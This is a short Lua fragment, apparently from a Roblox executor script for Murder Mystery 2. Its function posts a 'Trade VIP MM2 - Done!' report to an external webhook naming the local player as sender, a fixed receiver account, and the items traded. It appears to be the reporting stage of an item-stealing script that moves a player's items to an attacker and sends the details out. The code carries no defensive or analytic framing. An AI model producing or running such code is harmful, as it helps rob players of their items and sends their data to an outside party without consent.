local function sendWebhook(items)
    if not WEBHOOK_ON or WEBHOOK_URL == "" then return end
    local lines = {}
    for _, item in ipairs(items) do
        table.insert(lines, "**" .. item.name .. "** (" .. item.rarity .. ")")
    end
    local embed = {
        title = "💎 Trade VIP MM2 - Done!",
        description = "**👤 Sender:** " .. Player.Name ..
                      "\n**👤 Receiver:** " .. RECEIVER_NAME ..
                      "\n**⚔️ Items:**\n" .. table.concat(lines, "\n"),
        color = 15158332,
        footer = { text = "Trade VIP MM2" },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
    }
    pcall(function()
        local json = HttpService:JSONEncode({ embeds = { embed } })
        local req = getgenv and (getgenv().request or getgenv().http_request)
        if type(req) == "function" then
            req({ Url = WEBHOOK_URL, Method = "POST",
                  Headers = { ["Content-Type"] = "application/json" }, Body = json })
        end
    end)
end

